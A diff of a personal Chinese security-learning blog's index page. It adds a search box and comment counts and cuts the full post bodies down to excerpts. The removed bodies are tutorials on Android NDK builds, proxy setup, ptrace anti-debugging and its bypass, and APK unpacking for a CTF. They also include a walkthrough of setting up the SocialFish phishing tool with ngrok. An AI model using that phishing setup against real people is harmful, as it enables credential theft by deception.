@@ -239,9 +239,43 @@
       
 
       
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
     </ul>
   
 
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
   
 </nav>
 
@@ -275,7 +309,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -337,6 +371,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/02/hello-arm/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/02/02/hello-arm/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -363,21 +408,16 @@
       
         
           
-            <h1 id="gcc交叉编译"><a href="#gcc交叉编译" class="headerlink" title="gcc交叉编译"></a>gcc交叉编译</h1><p>暂时不想研究<a href="https://developer.android.com/ndk/guides/android_mk.html?hl=zh-cn" target="_blank" rel="noopener">Android.mk</a><br>就取巧了一下，用的<a href="https://developer.android.com/ndk/guides/standalone_toolchain.html?hl=zh-cn#itc" target="_blank" rel="noopener">独立工具链</a><br><strong>然而不行</strong></p>
-<h2 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><p>打开~/.bashrc文件，填入这些内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#android-ndk-gcc</span><br><span class="line">export NDK=~/Library/Android/sdk/ndk-bundle</span><br><span class="line">export SYSROOT=$NDK/platforms/android-21/arch-arm</span><br><span class="line">export CC=&quot;$NDK/toolchains/arm-linux-androideabi-4.9/prebuilt/ \</span><br><span class="line">linux-x86/bin/arm-linux-androideabi-gcc-4.9 --sysroot=$SYSROOT&quot;</span><br></pre></td></tr></table></figure></p>
-<p><code>source ~/.bashrc</code>启用。<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo2gnd3pjlj30fw02wwf1.jpg" alt=""></p>
-<h2 id="编写程序"><a href="#编写程序" class="headerlink" title="编写程序"></a>编写程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"hello arm!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>CC -o hello-arm -c hello-arm.c</code><br>理论上这样就可以了，然而我这还是不可以。无法解决的报错。<br> <img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2hiabc45j30ac012aa0.jpg" alt=""></p>
-<h1 id="使用ndk-build"><a href="#使用ndk-build" class="headerlink" title="使用ndk-build"></a>使用ndk-build</h1><p>因为上面那种方法GG,就只能用这种方法了~</p>
-<h2 id="添加环境变量-1"><a href="#添加环境变量-1" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><p>打开~/.bashrc<br>输入下面这两句<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo2iuyulkrj30ng0b0tb2.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export NDK=~/Library/Android/sdk/ndk-bundle</span><br><span class="line">alias ndk-build=&quot;$NDK/ndk-build&quot;</span><br></pre></td></tr></table></figure></p>
-<p>然后<code>source ~/.bashrc</code>，就可以使用ndk-build了。</p>
-<h2 id="新建android工程和jni目录"><a href="#新建android工程和jni目录" class="headerlink" title="新建android工程和jni目录"></a>新建android工程和jni目录</h2><p>这个肯定不用我说了……就建一个empty project即可<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2ixb4c11j30rt0ihmzt.jpg" alt=""></p>
-<h2 id="编写c文件和Android-mk"><a href="#编写c文件和Android-mk" class="headerlink" title="编写c文件和Android.mk"></a>编写c文件和Android.mk</h2><p>新建脚本文件名为Android.mk,这是ndk-build需要的工程编译脚本,描述了编译程序的各种选项和依赖.<br>内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_ARM_MODE := arm</span><br><span class="line">LOCAL_MODULE := hello-arm</span><br><span class="line">LOCAL_SRC_FILES := hello-arm.c</span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br></pre></td></tr></table></figure></p>
-<p>其中:<br>LOCAL_PATH表示本工程源码的路径, my-dir表示Android.mk的路径;<br>CLEAR_VARS让编译器清除已经定义过的宏,避免在编译多个模块时发生错误,因为这些宏是全局的,必须重新设置;<br>LOCAL_ARM_MODE指定程序使用的ARM指令模式;<br>LOCAL_MODULE指定生成的模块名,如果生成的是共享库,模块名会变为libhello-arm.so;<br>LOCAL_SRC_FILES指定源文件列表;<br>BUILD_EXECUTABLE表示生成的文件是可执行的,其他选项有BUILD_SHARED_LIBRARY(生成动态库),BUILD_STATIC_LIBRARY(生成静态库).</p>
-<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>在jni目录下，输入ndk-build，编译完成后的文件在libs/armeabi目录下.<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2izqzjhuj30fs09ymz6.jpg" alt=""></p>
-<h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>执行adb push hello-arm /data/local/tmp到手机上<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo2j0yxnxkj309x03vmxf.jpg" alt=""></p>
-
-          
+          gcc交叉编译暂时不想研究Android.mk就取巧了一下，用的独立工具链然而不行
+添加环境变量打开~/.bashrc文件，填入这些内容。12345#android-ndk-gccexport NDK=~/Library/Android/sdk/ndk-bundleexport SYSROOT=$N
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/02/02/hello-arm/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -429,7 +469,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -491,6 +531,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/02/SocialFish/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/02/02/SocialFish/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -517,14 +568,17 @@
       
         
           
-            <p>这是看到玄武的推送，觉得有意思，就写了这篇文章</p>
-<h1 id="下载SocialFish"><a href="#下载SocialFish" class="headerlink" title="下载SocialFish"></a>下载SocialFish</h1><p>SocialFish-与 Ngrok 集成的社工钓鱼工具<br><a href="https://github.com/UndeadSec/SocialFish" target="_blank" rel="noopener">https://github.com/UndeadSec/SocialFish</a><br>必须在Linux系统上使用，所以我使用的是虚拟机。</p>
-<h1 id="配置终端代理"><a href="#配置终端代理" class="headerlink" title="配置终端代理"></a>配置终端代理</h1><p>分析源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connected</span><span class="params">(host=<span class="string">'http://duckduckgo.com'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urlopen(host)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">if</span> connected() == <span class="keyword">False</span>:</span><br><span class="line">     <span class="keyword">print</span> <span class="string">'''</span></span><br><span class="line"><span class="string">  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ </span></span><br><span class="line"><span class="string">      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|</span></span><br><span class="line"><span class="string">      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |</span></span><br><span class="line"><span class="string">          \|           </span></span><br><span class="line"><span class="string">                    &#123;0&#125;[&#123;1&#125;!&#123;0&#125;]&#123;1&#125; Network error. Verify your connection.\n</span></span><br><span class="line"><span class="string">'''</span>.format(RED, END)</span><br><span class="line">     exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
-<p>很显然要翻墙才能运行，而ss的全局代理并不代理终端，所以我搜了一下资料进行了配置，参考我的<a href="http://eternalsakura13.com/2018/02/02/proxy/">这篇文章</a><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2f38rwj4j30ty0ac42m.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo2fcrgvmwj30ha06twfs.jpg" alt=""></p>
-<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo2f55j36qj317q0i278i.jpg" alt=""><br>显然原理就是先构造好钓鱼页面。<br>然后直接运行<code>python SocialFish.py</code>即可，不过遇到一个坑就是终端代理之后，curl不能访问127.0.0.1了。<br>所以改一下源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runNgrok</span><span class="params">()</span>:</span></span><br><span class="line">    system(<span class="string">'./Server/ngrok http 80 &gt; /dev/null &amp;'</span>)</span><br><span class="line">    sleep(<span class="number">10</span>)</span><br><span class="line">    system(<span class="string">'curl --noproxy "*" -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh &gt; ngrok.url'</span>)    </span><br><span class="line">    url = open(<span class="string">'ngrok.url'</span>, <span class="string">'r'</span>)</span><br><span class="line">    print(<span class="string">'\n &#123;0&#125;[&#123;1&#125;*&#123;0&#125;]&#123;1&#125; Ngrok URL: &#123;2&#125;'</span> + url.readlines()[<span class="number">0</span>] + <span class="string">'&#123;1&#125;'</span>).format(CYAN, END, GREEN)</span><br><span class="line">    url.close()</span><br></pre></td></tr></table></figure></p>
-<p><strong>system(‘curl –noproxy “<em>“ -s <a href="http://127.0.0.1:4040/status" target="_blank" rel="noopener">http://127.0.0.1:4040/status</a> | grep -P “https://.</em>?ngrok.io” -oh &gt; ngrok.url’)</strong><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2fkih24oj30kq0o3q5a.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo2flh3lbqj31kw0qmdpn.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo2flseinnj30se07wmzc.jpg" alt=""></p>
-
-          
+          这是看到玄武的推送，觉得有意思，就写了这篇文章
+下载SocialFishSocialFish-与 Ngrok 集成的社工钓鱼工具https://github.com/UndeadSec/SocialFish必须在Linux系统上使用，所以我使用的是虚拟机。
+配置终端代理分析源码12345678910
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/02/02/SocialFish/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -576,7 +630,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -638,6 +692,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/02/proxy/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/02/02/proxy/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -664,14 +729,16 @@
       
         
           
-            <h1 id="Mac终端代理"><a href="#Mac终端代理" class="headerlink" title="Mac终端代理"></a>Mac终端代理</h1><p><code>vim ~/.bash_profile</code><br>然后在里面输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias setproxy=&quot;export ALL_PROXY=socks5://127.0.0.1:1086&quot; </span><br><span class="line">alias unsetproxy=&quot;unset ALL_PROXY&quot;</span><br></pre></td></tr></table></figure></p>
-<p>export ALL_PROXY=socks5://127.0.0.1:<strong>1086</strong>,这里的1086根据自己的电脑去修改，设置如下<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo25z0wtk0j30io0m2td6.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo25zd0bvmj30qc0ikwh9.jpg" alt=""></p>
-<p>可以直接把上述代码拷贝到上述对应文件的末尾，修改完成之后执行如下命令使修改生效<br><code>source ~/.bash_profile</code><br>然后只要输入setproxy就可以设置代理，输入unsetproxy就取消代理<br>设置完毕后，输入<code>curl -i http://ip.cn</code>确认修改成功。</p>
-<h1 id="虚拟机走终端代理"><a href="#虚拟机走终端代理" class="headerlink" title="虚拟机走终端代理"></a>虚拟机走终端代理</h1><h2 id="修改ss配置"><a href="#修改ss配置" class="headerlink" title="修改ss配置"></a>修改ss配置</h2><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo262zvsgjj30qo0humza.jpg" alt=""></p>
-<h2 id="设置虚拟机"><a href="#设置虚拟机" class="headerlink" title="设置虚拟机"></a>设置虚拟机</h2><p>先看一下自己电脑的ip是多少<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-27-195715.png" alt=""><br>我这里使用的是共享网络，不知道换其他行不行。<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo263h4zarj30rq0gytc7.jpg" alt=""><br>然后在setting-&gt;network<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-27-195650.png" alt="">修改成功后在终端输入<br><code>export ALL_PROXY=http://192.168.10.201:1087</code><br>然后输入<br><code>curl -i http://ip.cn</code>确认。</p>
-<h2 id="windodws"><a href="#windodws" class="headerlink" title="windodws"></a>windodws</h2><p>算是一个补充<br>勾选上允许来自局域网的链接选项。<br>然后设置虚拟机的网络模式为桥接模式（注意不要勾选复制主机的网络）<br>这样主机和虚拟机在一个局域网里。<br>然后在setting-&gt;network里向上面那么设置，1087改成1080.<br>在终端里export ALL_PROXY=<a href="http://xxxx:1080" target="_blank" rel="noopener">http://xxxx:1080</a><br>这个1080其实就是那个本地端口，一般我们都是设置1080的。</p>
-
-          
+          Mac终端代理vim ~/.bash_profile然后在里面输入12alias setproxy=&quot;export ALL_PROXY=socks5://127.0.0.1:1086&quot; alias unsetproxy=&quot;unset ALL_PROXY&quot;
+ex
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/02/02/proxy/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -723,7 +790,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -785,6 +852,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/01/ptrace/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/02/01/ptrace/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -811,40 +889,16 @@
       
         
           
-            <blockquote>
-<p>The ptrace() system call provides a means by which one process (the”tracer”) may observe and control the execution of another process(the “tracee”), and examine and change the tracee’s memory andregisters. It is primarily used to implement breakpoint debugging and system call tracing.</p>
-</blockquote>
-<p><a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">帮助文档</a></p>
-<h2 id="ptrace和debugger原理"><a href="#ptrace和debugger原理" class="headerlink" title="ptrace和debugger原理"></a>ptrace和debugger原理</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>ptrace可以让一个进程监视和控制另一个进程的执行,并且修改被监视进程的内存、寄存器等,主要应用于断点调试和系统调用跟踪.<br>函数原型:<br><code>long ptrace(int request, pid_t pid, void * addr, void * data)</code><br>其中,request代表请求类型,pid代表被调试进程的pid.</p>
-<h3 id="部分ptrace-request和wait"><a href="#部分ptrace-request和wait" class="headerlink" title="部分ptrace request和wait"></a>部分ptrace request和wait</h3><ul>
-<li>PTRACE_TRACEME<br>表示本进程将被其父进程跟踪，交付给这个进程的所有信号（除SIGKILL之外），都将使其停止，父进程将通过wait()获知这一情况。<br>它通常总是与 fork/exec 一起使用。对于每一个进程，PTRACE_TRACEME 只能被调用一次。</li>
-<li>PTRACE_ATTACH<br>根据pid将调试进程附加到被调试进程上,PTRACE_ATTACH向被调试进程发送SIGSTOP信号使之停下.<br>但是在ptrace(PTRACE_ATTACH,pid,0,0)执行完毕时被调试进程可能还没有暂停,可以使用waitpid()等待其停下.</li>
-<li>PTRACE_DETACH<br>将被调试进程与调试进程分离,使被调试进程正常运行.</li>
-<li>PTRACE_SYSCALL<br>使被调试进程继续运行,但是在下一个系统调用的入口处或出口处停下,或者是执行完一条指令后停下.<br>例如,调试进程可以监视被调试进程系统调用入口处的参数,接着再使用SYSCALL,监视系统调用的返回值.</li>
-<li>wait()<br>wait函数会延迟父进程的执行，直到被调试的进程切换为停止状态或者终止为止.</li>
-</ul>
-<h3 id="调试器建立调试关系的两种方式"><a href="#调试器建立调试关系的两种方式" class="headerlink" title="调试器建立调试关系的两种方式:"></a>调试器建立调试关系的两种方式:</h3><p>用gdb调试程序，可以直接gdb ./test,也可以gdb <pid>(test的进程号)。这对应着使用ptrace建立跟踪关系的两种方式:</pid></p>
-<ul>
-<li>fork:利用fork+execve执行被测试的程序，子进程在执行execve之前调用ptrace(PTRACE_TRACEME)，建立了与父进程(debugger)的跟踪关系。</li>
-<li>attach: debugger可以调用ptrace(PTRACE_ATTACH，pid,…)，建立自己与进程号为pid的进程间的跟踪关系。即利用PTRACE_ATTACH，使自己变成被调试程序的父进程(用ps可以看到)。用attach建立起来的跟踪关系，可以调用ptrace(PTRACE_DETACH，pid,…)来解除。注意attach进程时的权限问题，如一个非root权限的进程是不能attach到一个root进程上的。</li>
-</ul>
-<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>ptrace被广泛用于反调试,因为一个进程只能被ptrace一次,如果事先调用了ptrace方法,那就可以防止别人调试我们的程序.</p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试程序:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Hello Ptrace!\n"</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>编译:<code>gcc -g -o hello-ptrace hello-ptrace.c</code></p>
-<p>运行并用gdb调试，发现已经被抢占，不能attach</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0e0mwjabj30sl0lk135.jpg" alt=""></p>
-<p>已经由于PTRACE_TRACEME，被父进程trace</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0elwfbgmj30jo0isjvh.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0f058ljqj30g5014dfv.jpg" alt=""></p>
-<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;sys/ptrace.h&gt;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    if(-1 == ptrace(PTRACE_TRACEME))</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Debugger!\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Hello Ptrace!\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fo0f49zmkjj30ks0bjq8n.jpg" alt=""></p>
-<h2 id="反反调试"><a href="#反反调试" class="headerlink" title="反反调试"></a>反反调试</h2><p>ptrace用户态源码(位于bionic/libc/bionic/ptrace.c):<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">void</span> * addr, <span class="keyword">void</span> * data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (request) &#123;</span><br><span class="line">        <span class="keyword">case</span> PTRACE_PEEKUSR:</span><br><span class="line">        <span class="keyword">case</span> PTRACE_PEEKTEXT:</span><br><span class="line">        <span class="keyword">case</span> PTRACE_PEEKDATA:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">long</span> word;</span><br><span class="line">            <span class="keyword">long</span> ret;</span><br><span class="line">            ret = __ptrace(request, pid, addr, &amp;word);</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> word;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// __ptrace will set errno for us</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">             <span class="keyword">return</span> __ptrace(request, pid, addr, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>0表示成功,-1表示错误.</p>
-<ul>
-<li>单个应用可在ptrace下断点.</li>
-<li>定制ROM,可以将ptrace源代码修改为如果是自己的pid调用ptrace,返回-1;否则返回0.</li>
-</ul>
-
           
+The ptrace() system call provides a means by which one process (the”tracer”) may observe and control the execution of another process(the “tracee”), 
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/02/01/ptrace/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -896,7 +950,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -958,6 +1012,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/01/ali_re3/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/02/01/ali_re3/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -984,26 +1049,16 @@
       
         
           
-            <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><a href="http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/" target="_blank" rel="noopener">http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/</a><br><a href="http://blog.csdn.net/jiangwei0910410003/article/details/48104581" target="_blank" rel="noopener">http://blog.csdn.net/jiangwei0910410003/article/details/48104581</a></p>
-<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/jscrack.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/jscrack.apk</a><br>可能是因为赛题是14年的，有点老了，所以在5.0.1上运行失败，用android 4.4.4就可以运行了。</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="加固方式"><a href="#加固方式" class="headerlink" title="加固方式"></a>加固方式</h3><p>现在市场中加固apk的方式一般就是两种：一种是对源apk整体做一个加固，放到指定位置，运行的时候在解密动态加载，还有一种是对so进行加固，在so加载内存的时候进行解密释放。我们今天主要看第一种加固方式，就是对apk整体进行加固。<br>当我们发现apk中主要的类都没有了，肯定是apk被加固了，加固的源程序肯定是在本地，一般会有这么几个地方需要注意的：<br>1、应用程序的asset目录，我们知道这个目录是不参与apk的资源编译过程的，所以很多加固的应用喜欢把加密之后的源apk放到这里<br>2、把源apk加密放到壳的dex文件的尾部，这个肯定不是我们这里的案例，但是也有这样的加固方式，<strong>这种加固方式会发现使用dex2jar工具解析dex是失败的</strong>，我们这时候就知道了，肯定对dex做了手脚<br>3、把源apk加密放到so文件中，这个就比较难了，一般都是把源apk进行拆分，存到so文件中，分析难度会加大的。</p>
